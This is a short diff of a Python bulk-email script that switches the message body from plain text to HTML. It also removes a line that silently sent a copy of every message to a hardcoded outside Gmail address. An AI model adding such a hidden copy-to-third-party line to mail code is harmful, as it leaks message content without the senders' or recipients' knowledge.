@@ -100,7 +100,7 @@ def send_email_func(file_name, sender_email, password, smtp_server, port, subjec
 			email_message['Subject'] = subject
 
       # Attach the message body
-			email_message.attach(MIMEText(msg, 'plain', 'utf-8'))
+			email_message.attach(MIMEText(msg, 'html', 'utf-8'))
 
 			try:
 					response = server.sendmail(sender_email, recipient_email, email_message.as_string())  # Attempt to send the email
@@ -109,8 +109,6 @@ def send_email_func(file_name, sender_email, password, smtp_server, port, subjec
 			except Exception as e:
 					print(f"Error sending email to {recipient_email}: {e}\n")
 					continue
-
-		server.sendmail(sender_email, "pyabdpy@gmail.com", email_message.as_string())
 
 # Define a function to call send_email_func for each account
 def send_email_for_account(account):
